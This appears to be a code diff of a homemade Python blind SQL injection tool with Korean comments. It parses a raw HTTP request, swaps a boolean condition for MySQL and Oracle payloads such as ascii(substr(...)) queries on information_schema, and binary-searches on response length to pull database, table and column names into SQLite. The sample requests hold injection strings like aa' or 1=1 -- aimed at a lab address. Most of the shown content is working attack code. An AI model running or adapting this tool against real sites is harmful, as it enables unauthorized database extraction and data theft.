@@ -1,9 +1,8 @@
-# 
 ####################
-# 1. 파일에서 리퀘스트 값 받아오기 
-# 2. POST 문제 해결 # 대충 해결함
-# 3. 다른 데이터베이스 페이로드 생성 # MYSQL, ORACLE 완료
-# 4. 데이터 출력 구현,  조회해서 나온 값을 (테이블 생성하고 각 컬럼들 값들을 SQLite에 테이블 그대로 복사느낌으로 저장)
+# 1. Request 입력한 파일 값 받아오기
+# 2. DB, TABLE, COLUMN 외 데이터 출력 구현
+# 3. 다른 데이터베이스 페이로드 생성 # !! MYSQL, ORACLE 완료
+####################
 
 # -*- coding: utf-8 -*-   
 from time import sleep
@@ -21,24 +20,9 @@ args = None
 true_message_size = None # 참(ture)의 경우 message size
 
 
-REQUEST_STRING = """
-POST / HTTP/1.1
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
-Accept-Encoding: gzip, deflate, br
-Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
-Connection: keep-alive
-Host: 192.168.219.100:5001
-Accept-Language: ko-KR,ko;q=0.9
-Upgrade-Insecure-Requests: 1
-Cookie: security_level=0; PHPSESSID=117eca5e7194d9415b200e7a15200933
-Content-Type: application/x-www-form-urlencoded
-Content-Length: 83
-
-username='%7C%7C(case+when+1=1+then+'kazal92'+else+'test'+end)%7C%7C'&password=1234"""
-
-
+############# GET request 예시 ###############
 # REQUEST_STRING = """
-# GET /?username='||(case+when+1=1+then+'kazal92'+else+'test'+end)||'&password=1234 HTTP/1.1
+# POST / HTTP/1.1
 # User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
 # Accept-Encoding: gzip, deflate, br
 # Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
@@ -47,9 +31,27 @@ username='%7C%7C(case+when+1=1+then+'kazal92'+else+'test'+end)%7C%7C'&password=1
 # Accept-Language: ko-KR,ko;q=0.9
 # Upgrade-Insecure-Requests: 1
 # Cookie: security_level=0; PHPSESSID=117eca5e7194d9415b200e7a15200933
+# Content-Type: application/x-www-form-urlencoded
+# Content-Length: 83
 
-
+# username='%7C%7C(case+when+1=1+then+'kazal92'+else+'test'+end)%7C%7C'&password=1234
 # """
+
+
+############## GET request 예시 ###############
+REQUEST_STRING = """
+GET /?username=aa'+or+1=1+--+&password=1234 HTTP/1.1
+Host: 192.168.219.100:5001
+Cache-Control: max-age=0
+Accept-Language: ko-KR,ko;q=0.9
+Origin: http://192.168.219.100:5001
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.6668.71 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+Referer: http://192.168.219.100:5001/
+Accept-Encoding: gzip, deflate, br
+Cookie: security_level=0; PHPSESSID=8b9bc69d316ada9443e502f798cdb748
+Connection: keep-alive"""
 
 class Colors:
 	""" ANSI color codes """
@@ -127,7 +129,6 @@ class SQLiteProcessor:
 		cursor.execute('CREATE TABLE IF NOT EXISTS dbs_info (id INTEGER PRIMARY KEY AUTOINCREMENT, db_name VARCHAR(255), UNIQUE(db_name))')
 		cursor.execute('CREATE TABLE IF NOT EXISTS table_info (id INTEGER PRIMARY KEY AUTOINCREMENT, db_name VARCHAR(255), table_name VARCHAR(255), UNIQUE(db_name, table_name))')
 		cursor.execute('CREATE TABLE IF NOT EXISTS column_info (id INTEGER PRIMARY KEY AUTOINCREMENT, db_name VARCHAR(255), table_name VARCHAR(255), column_name VARCHAR(255), UNIQUE(db_name, table_name, column_name))')
-	# def result_table_create():
 		
 	def result_set_name(insert_db_data, select_table_one=None, field=None): # 중복코드 추후 수정
 		if args.basic:
@@ -150,11 +151,21 @@ class SQLiteProcessor:
 
 
 def url_encode(item):
-	return urllib.parse.quote(item).replace('%20', '+').replace('%3D', '=').replace('%27', '\'').replace('%28','(').replace('%29',')').replace('%3E', '>').replace('%2C', ',').replace('%3C', '<')
+	return urllib.parse.quote(item)
 
 def url_decode(item):
 	return urllib.parse.unquote(item).replace('+', ' ')
 
+def line_delete(req):
+	request_str = req
+
+	if req.endswith('\n'):
+		request_str = request_str.rstrip('\n')
+	if not req.startswith('\n'):
+		request_str = '\n' + request_str
+	
+	return request_str
+	
 def parse_request(request):
 	headers = {} # 헤더 딕셔너리
 	data = {} # GET 파라미터 딕셔너리
@@ -301,7 +312,6 @@ def setpayload():
 					'columns' : "ascii(substr((SELECT column_name FROM information_schema.columns WHERE table_schema NOT IN('mysql','information_schema') AND table_schema IN('{select_db}') AND table_name IN('{select_table}') LIMIT {rows},1),{substr_index},1))>{mid_val}"
 				}
 			}
-		
 	return payloads
 
 def check_condition(data, method, url, path, headers):
@@ -319,7 +329,6 @@ def check_condition(data, method, url, path, headers):
 		url = f"{args.schema}://{url}{path}" # HTTP , HTTPS 입력 sechma
 		response = requests.request(method, url, headers=headers, data=data, proxies=proxies, timeout=timeout, verify=False)
 		true_message_size = len(response.content) # 저장
-
 	
 def recursive(min_val, max_val, data_val, payload_fix, substr_index=None, rows_=None, select_db=None, select_table=None, select_column=None):
 	mid_val = int((min_val+max_val)/2)
@@ -339,18 +348,17 @@ def recursive(min_val, max_val, data_val, payload_fix, substr_index=None, rows_=
 	return     recursive(min_val, mid_val, data_val, payload_fix, substr_index, rows_, select_db, select_table, select_column)
 		
 def connection(data, method, url, path, headers):
+	if method == 'GET': # 샵(#) 같은 문자가 GET으로 날릴떄 인코딩 안하면 뒤에 문자열 짤림
+		data[args.parameter] = url_encode(data[args.parameter])
 	
-	data[args.parameter] = url_decode(data[args.parameter])
-
 	params = '&'.join([f"{key}={value}" for key, value in data.items()])      
-	# print(params) # 요청전 최종 페이로드 확인
 	proxies = {'http': args.proxy, 'https': args.proxy}
 	timeout = 30
 	if method == 'GET':
 		url = f"{args.schema}://{url}{path}?{params}" # HTTP , HTTPS 입력 sechma
 		response = requests.request(method, url, headers=headers, proxies=proxies, timeout=timeout, verify=False)
-		check_message_size = response.content
-
+		# print(url_decode(response.url))
+		check_message_size = len(response.content)
 	else:
 		url = f"{args.schema}://{url}{path}" # HTTP , HTTPS 입력 sechma
 		response = requests.request(method, url, headers=headers, data=data, proxies=proxies, timeout=timeout, verify=False)
@@ -360,6 +368,8 @@ def connection(data, method, url, path, headers):
 		return 1    # true
 	return 0    # false
 
+
+
 def query_start():
 	row_count = 1 # 행 개수
 	name_tmp = []
@@ -367,13 +377,13 @@ def query_start():
 	result_data = {}
 	data_len  = 0
 	select_tables = [None] # --dbs, --tables 를 실행할때는 None으로 설정
-	dbms = args.dbms.lower()
-
 	payloads = setpayload() # 인수에 따른 페이로드 셋팅
-	data, condition = parse_request(REQUEST_STRING) # 응답데이터 파싱
+	dbms = args.dbms.lower()
+	test= line_delete(REQUEST_STRING)
+
+	data, condition = parse_request(line_delete(REQUEST_STRING)) # 응답데이터 파싱
 	check_condition(**data) # True 응답 길이 저장 (참거짓 구분 용도) 	
 	result_payload = payload_set(condition, payloads) # 조건식에서 1=1 을 페이로드로 리플레이스
-
 
 	if args.select_table != None: # 테이블의 컬럼을 여러개 선택하는 경우 ex) -C blog, movies
 		select_tables = [] # --Columns의 경우 None 값 초기화
@@ -388,7 +398,7 @@ def query_start():
 				row_count = recursive(0, 127, data, result_payload[key]['count'],None, None, args.select_db, select_table_one, None)
 		else:
 			row_count = 1
-		print(f"{Colors.LIGHT_BLUE}[*] '{Colors.LIGHT_BLUE}{select_table_one}'{Colors.END} {Colors.LIGHT_PURPLE}라인 개수 : {str(row_count)}{Colors.END}" if select_table_one else f"{Colors.LIGHT_BLUE}[*] 레코드 수 : {str(row_count)}{Colors.END}")
+		print(f"{Colors.LIGHT_BLUE}[*] '{Colors.LIGHT_BLUE}{select_table_one}'{Colors.END} {Colors.LIGHT_PURPLE}라인 수 : {str(row_count)}{Colors.END}" if select_table_one else f"{Colors.LIGHT_BLUE}[*] 레코드 수 : {str(row_count)}{Colors.END}")
 
 		for rows in range(0, row_count, 1):  # 레코드 갯수 만큼 반복  # range(row_count)로 해도됨
 			for key, value in result_payload.items():
